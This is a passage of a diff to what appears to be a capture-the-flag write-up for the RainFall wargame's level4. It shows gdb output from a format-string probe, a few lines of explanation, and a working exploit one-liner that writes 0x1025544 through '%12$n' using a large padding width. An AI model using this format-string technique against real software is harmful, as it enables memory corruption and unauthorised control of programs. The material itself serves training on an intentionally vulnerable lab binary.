@@ -81,6 +81,10 @@ AAAA %p  %p %p %p %p %p %p %p %p %p %p %p
 AAAA 0xb7ff26b0  0xbffff734 0xb7fd0ff4 (nil) (nil) 0xbffff6f8 0x804848d 0xbffff4f0 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141
 [Inferior 1 (process 2788) exited normally] 
 (gdb) quit
+
+this time its the 12th address we need to overwrite to match the value of the comparison, so 0x1025544
+since we can't print that much with python, we'll use the printf to print x numbers of precision with a %xx
+
 level4@RainFall:~$ cat <(python -c 'print "\x08\x04\x98\x10"[::-1] + "%16930112x" + "%12$n"') - | ./level4
 
  [...]
